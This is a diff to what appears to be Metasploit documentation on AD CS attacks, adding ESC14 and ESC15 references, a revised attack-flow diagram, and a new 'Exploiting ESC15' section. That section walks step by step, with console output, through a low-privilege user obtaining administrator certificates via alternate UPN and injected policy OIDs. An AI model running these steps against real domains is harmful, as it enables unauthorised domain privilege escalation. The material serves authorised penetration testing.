@@ -8,14 +8,16 @@ flowchart TD
     subgraph ad_cs_cert_templates[<b>ad_cs_cert_templates</b>]
         ESC4(ESC4)
         update_template[<i>Update Template</i>]
-        ESC4 --> update_template
+        ESC4 -- abuse privileges --> update_template
     end
     subgraph icpr_cert[<b>icpr_cert</b>]
         ESC1(ESC1)
         ESC2(ESC2)
         ESC3(ESC3)
         ESC13(ESC13)
+        ESC15(ESC15)
         alt_subject[<i>Alternate Subject Issuance</i>]
+        add_policies[<i>Alternate Subject Issuance</i><br>and<br><i>Add Policy OIDs</i>]
         as_eagent[<i>Enrollment Agent Issuance</i>]
         normal[<i>Normal Issuance</i>]
 
@@ -23,17 +25,25 @@ flowchart TD
         ESC2 --> as_eagent
         ESC3 --> as_eagent
         ESC13 --> normal
+        ESC15 --> add_policies
         as_eagent -- use new certificate --> normal
     end
     subgraph kerberos/get_ticket[<b>kerberos/get_ticket</b>]
         PKINIT[<i>PKINIT</i>]
     end
+    subgraph ldap/ldap_login[<b>ldap/ldap_login</b>]
+        SCHANNEL[<i>SCHANNEL</i>]
+    end
     subgraph ldap_esc_vulnerable_cert_finder[<b>ldap_ecs_vulnerable_cert_finder</b>]
         find_vulnerable_templates[<i>Find Vulnerable Templates</i>]
     end
+    add_policies -- add client authentication oid --> SCHANNEL
+    add_policies -- add certificate request agent oid --> as_eagent
     alt_subject --> PKINIT
+    alt_subject --> SCHANNEL
     find_vulnerable_templates --> icpr_cert
     normal --> PKINIT
+    normal --> SCHANNEL
     update_template --> ESC1
 ```
 
@@ -93,9 +103,15 @@ Later, additional techniques were disclosed by security researchers:
 - ESC13 - Domain escalation via issuance policies with group links.
   - [ADCS ESC13 Abuse Technique](https://posts.specterops.io/adcs-esc13-abuse-technique-fda4272fbd53)
   - [[Exploit Steps|attacking-ad-cs-esc-vulnerabilities.md#exploiting-esc13]]
+- ESC14 - Explicit certificate mappings through `altSecurityIdentities` write access abuse
+  - [ADCS ESC14 Abuse Technique](https://posts.specterops.io/adcs-esc14-abuse-technique-333a004dc2b9)
+- ESC15 (AKA EKUwu) - Domain escalation via No Issuance Requirements + CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT + Policy OID
+  manipulation
+  - [EKUwu: Not just another AD CS ESC](https://trustedsec.com/blog/ekuwu-not-just-another-ad-cs-esc)
+  - [[Exploit Steps|attacking-ad-cs-esc-vulnerabilities.md#exploiting-esc15]]
 
-Currently, Metasploit only supports attacking ESC1, ESC2, ESC3, ESC4 and ESC13. As such,
-this page only covers exploiting ESC1 through ESC4 and ESC13 at this time.
+Currently, Metasploit only supports attacking ESC1, ESC2, ESC3, ESC4, ESC13 and ESC15. As such,
+this page only covers exploiting ESC1 through ESC4, ESC13 and ESC15 at this time.
 
 Before continuing, it should be noted that ESC1 is slightly different than ESC2 and ESC3
 as the diagram notes above. This is because in ESC1, one has control over the
@@ -155,7 +171,7 @@ Domain Controller (DC), and will run a set of LDAP queries to gather a list of c
 templates they make available for enrollment. It will then also query the permissions on both the CA and the certificate template to figure out
 which users or groups can use that certificate template to elevate their privileges.
 
-Currently the module is capable of checking for certificates that are vulnerable to ESC1, ESC2, ESC3, and ESC13. The
+Currently the module is capable of checking for certificates that are vulnerable to ESC1, ESC2, ESC3, ESC13 and ESC15. The
 module is limited to checking for these techniques due to them being identifiable remotely from a normal user account by
 analyzing the objects in LDAP.
 
@@ -910,6 +926,108 @@ msf6 auxiliary(admin/dcerpc/icpr_cert) >
 
 We can then use the `kerberos/get_ticket` module to gain a Kerberos ticket granting ticket (TGT) with the `ESC13-Group`
 RID present in the Groups field of the TGT PAC.
+
+# Exploiting ESC15
+Steps for exploiting ESC15 are similar to ESC1 whereby a privileged user such as a domain admin is specified in the
+`ALT_UPN`. In addition to targeting another user, the certificate has additional Application Policy OIDs added to it
+which adjusts the context in which the issued certificate can be used. These policy OIDs are accepted by the issuing CA
+if the target certificate template is defined using schema version 1.
+
+In the following example, the Client Authentication OID (1.3.6.1.5.5.7.3.2) is added which enables the certificate to be
+used for authentication to LDAP via SCHANNEL. The operator can then perform LDAP queries with the privileges of the user
+specified in the alternate UPN.
+
+```msf
+msf6 auxiliary(admin/dcerpc/icpr_cert) > set RHOSTS 172.30.239.85
+RHOSTS => 172.30.239.85
+msf6 auxiliary(admin/dcerpc/icpr_cert) > set SMBUser normaluser
+SMBUser => normaluser
+msf6 auxiliary(admin/dcerpc/icpr_cert) > set SMBDomain COLLALABS1
+SMBDomain => COLLALABS1
+msf6 auxiliary(admin/dcerpc/icpr_cert) > set SMBPass normalpass
+SMBPass => normalpass
+msf6 auxiliary(admin/dcerpc/icpr_cert) > set CA collalabs1-SRV-ADDS01-CA
+CA => collalabs1-SRV-ADDS01-CA
+msf6 auxiliary(admin/dcerpc/icpr_cert) > set CERT_TEMPLATE ESC15-Test
+CERT_TEMPLATE => ESC15-Test
+msf6 auxiliary(admin/dcerpc/icpr_cert) > set ADD_CERT_APP_POLICY 1.3.6.1.5.5.7.3.2
+ADD_CERT_APP_POLICY => 1.3.6.1.5.5.7.3.2
+msf6 auxiliary(admin/dcerpc/icpr_cert) > set ALT_UPN administrator@collalabs1.local
+ALT_UPN => administrator@collalabs1.local
+msf6 auxiliary(admin/dcerpc/icpr_cert) > set ALT_SID S-1-5-21-3402587289-1488798532-3618296993-1000
+ALT_SID => S-1-5-21-3402587289-1488798532-3618296993-1000
+msf6 auxiliary(admin/dcerpc/icpr_cert) > run
+[*] Running module against 172.30.239.85
+
+[*] 172.30.239.85:445 - Requesting a certificate...
+[+] 172.30.239.85:445 - The requested certificate was issued.
+[*] 172.30.239.85:445 - Certificate UPN: administrator@collalabs1.local
+[*] 172.30.239.85:445 - Certificate Policies:
+[*] 172.30.239.85:445 -   * 1.3.6.1.5.5.7.3.2 (Client Authentication)
+[*] 172.30.239.85:445 - Certificate stored at: /home/normaluser/.msf4/loot/20241009171337_default_172.30.239.85_windows.ad.cs_089081.pfx
+[*] Auxiliary module execution completed
+msf6 auxiliary(admin/dcerpc/icpr_cert) >
+```
+
+Certificates issued using this technique are not directly able to be used for Kerberos authentication via PKINIT.
+However, the attack can be modified by adding the Certificate Request Agent OID (1.3.6.1.4.1.311.20.2.1) to issue a
+certificate that can issue additional certificates in a manner similar to ESC2 which are compatible with PKINIT.
+
+```msf
+msf6 auxiliary(admin/dcerpc/icpr_cert) > set RHOSTS 172.30.239.85
+RHOSTS => 172.30.239.85
+msf6 auxiliary(admin/dcerpc/icpr_cert) > set SMBUser normaluser
+SMBUser => normaluser
+msf6 auxiliary(admin/dcerpc/icpr_cert) > set SMBDomain COLLALABS1
+SMBDomain => COLLALABS1
+msf6 auxiliary(admin/dcerpc/icpr_cert) > set SMBPass normalpass
+SMBPass => normalpass
+msf6 auxiliary(admin/dcerpc/icpr_cert) > set CA collalabs1-SRV-ADDS01-CA
+CA => collalabs1-SRV-ADDS01-CA
+msf6 auxiliary(admin/dcerpc/icpr_cert) > set CERT_TEMPLATE ESC15-Test
+CERT_TEMPLATE => ESC15-Test
+msf6 auxiliary(admin/dcerpc/icpr_cert) > set ADD_CERT_APP_POLICY 1.3.6.1.4.1.311.20.2.1
+ADD_CERT_APP_POLICY => 1.3.6.1.4.1.311.20.2.1
+msf6 auxiliary(admin/dcerpc/icpr_cert) > run
+[*] Running module against 172.30.239.85
+
+[*] 172.30.239.85:445 - Requesting a certificate...
+[+] 172.30.239.85:445 - The requested certificate was issued.
+[*] 172.30.239.85:445 - Certificate UPN: administrator@collalabs1.local
+[*] 172.30.239.85:445 - Certificate Policies:
+[*] 172.30.239.85:445 -   * 1.3.6.1.4.1.311.20.2.1 (Certificate Request Agent)
+[*] 172.30.239.85:445 - Certificate stored at: /home/normaluser/.msf4/loot/20241009172714_default_172.30.239.85_windows.ad.cs_659672.pfx
+[*] Auxiliary module execution completed
+msf6 auxiliary(admin/dcerpc/icpr_cert) >
+```
+
+Next, the certificate is used in conjunction with the `PFX` and `ON_BEHALF_OF` options to issue a certificate compatible
+with Kerberos as the privileged user (previously `ALT_UPN`).
+
+```
+msf6 auxiliary(admin/dcerpc/icpr_cert) > unset ADD_CERT_APP_POLICY 
+Unsetting ADD_CERT_APP_POLICY...
+msf6 auxiliary(admin/dcerpc/icpr_cert) > unset ALT_UPN 
+Unsetting ALT_UPN...
+msf6 auxiliary(admin/dcerpc/icpr_cert) > set CERT_TEMPLATE User
+CERT_TEMPLATE => User
+msf6 auxiliary(admin/dcerpc/icpr_cert) > set ON_BEHALF_OF COLLALABS1\\administrator
+ON_BEHALF_OF => COLLALABS1\\administrator
+msf6 auxiliary(admin/dcerpc/icpr_cert) > set PFX /home/normaluser/.msf4/loot/20241009172714_default_172.30.239.85_windows.ad.cs_659672.pfx
+PFX => /home/normaluser/.msf4/loot/20241009172714_default_172.30.239.85_windows.ad.cs_659672.pfx
+msf6 auxiliary(admin/dcerpc/icpr_cert) > run
+[*] Running module against 172.30.239.85
+
+[*] 172.30.239.85:445 - Requesting a certificate...
+[+] 172.30.239.85:445 - The requested certificate was issued.
+[*] 172.30.239.85:445 - Certificate Email: administrator@collalabs1.local
+[*] 172.30.239.85:445 - Certificate UPN: administrator@collalabs1.local
+[*] 172.30.239.85:445 - Certificate stored at: /home/normaluser/.msf4/loot/20241009172817_default_172.30.239.85_windows.ad.cs_427087.pfx
+[*] Auxiliary module execution completed
+msf6 auxiliary(admin/dcerpc/icpr_cert) >
+```
+
+Finally, *this* certificate can be used to authenticate to Kerberos with the `kerberos/get_ticket` module.
 
 # Authenticating With A Certificate
 Metasploit supports authenticating with certificates in a couple of different ways. These techniques can be used to take
